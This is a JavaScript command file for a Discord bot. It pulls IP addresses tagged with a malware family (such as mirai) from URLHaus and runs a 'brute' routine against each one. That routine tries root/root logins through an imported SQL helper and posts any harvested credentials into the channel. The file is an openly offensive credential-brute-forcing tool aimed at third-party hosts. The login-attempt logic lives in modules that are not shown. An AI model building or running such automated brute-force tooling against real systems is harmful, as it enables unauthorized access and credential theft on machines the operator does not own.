const Discord = require("discord.js");
const config = require("../data/config.json");

const haus = require("../../src/haus");
const sql = require("../../src/sql");

module.exports.info = {
    name: "URLHaus",
    description: "Automatically runs the brute command on all URLHaus IPs"
}

module.exports.run = (bot, msg, args) => {
    if(msg.channel.type == "dm") {
        msg.delete();

        let embed = new Discord.MessageEmbed()
            .setTitle(`Seems there was an error.`)
            .setColor(config.colours.red)
            .setDescription("You can't run this command outside of the Server")
            .setFooter(`Command executed by: ${msg.author.tag}`)
            .setTimestamp();
        
        msg.channel.send({embed: embed});
    } else {
        if(msg.args < 1) {
            let embed = new Discord.MessageEmbed()
                .setTitle(`Seems there was an error.`)
                .setColor(config.colours.red)
                .setDescription("Incorrect arguments.\n`--urlhaus [tag(mirai)]`")
                .setFooter(`Command executed by: ${msg.author.tag}`)
                .setTimestamp();
            
            return msg.channel.send({embed: embed});
        }

        let tag = args[0];

        haus.getIPs(tag).then(ips => {
            ips = JSON.parse(ips)
            
            let embed = new Discord.MessageEmbed()
                .setTitle(`Successfully scraped URLHaus`)
                .setColor(config.colours.green)
                .setDescription(ips.message)
                .setFooter(`Command executed by: ${msg.author.tag}`)
                .setTimestamp();
            
            msg.channel.send({embed: embed});

            for(let i = 0; i < ips.ips.length; i++) {
                let ip = ips.ips[i];
                sql.getLogins(ip, "root", "root").then(users => {
                    users = JSON.parse(users);

                    if(users.creds.length > 0) {
                        let embed = new Discord.MessageEmbed()
                            .setTitle(users.message)
                            .setColor(config.colours.green)
                            .setDescription(`${users.message}\nIP: ${ip}\nCredentials: ${users.creds.toString().replace(/\,/g, ", ")}`)
                            .setFooter(`Command executed by: ${msg.author.tag}`)
                            .setTimestamp();
                        
                        return msg.channel.send({embed: embed});
                    } else {
                        let embed = new Discord.MessageEmbed()
                            .setTitle(`Unable to find any credentials.`)
                            .setColor(config.colours.red)
                            .setDescription(`Can't find any credentials, maybe try again?`)
                            .setFooter(`Command executed by: ${msg.author.tag}`)
                            .setTimestamp();
                        
                        return msg.channel.send({embed: embed});
                    }
                }).catch(() => {});
            }
        }).catch(e => {
            e = JSON.parse(e);

            let embed = new Discord.MessageEmbed()
                .setTitle(`Seems there was an error.`)
                .setColor(config.colours.red)
                .setDescription(e.message)
                .setFooter(`Command executed by: ${msg.author.tag}`)
                .setTimestamp();
            
            return msg.channel.send({embed: embed});
        })
    }
}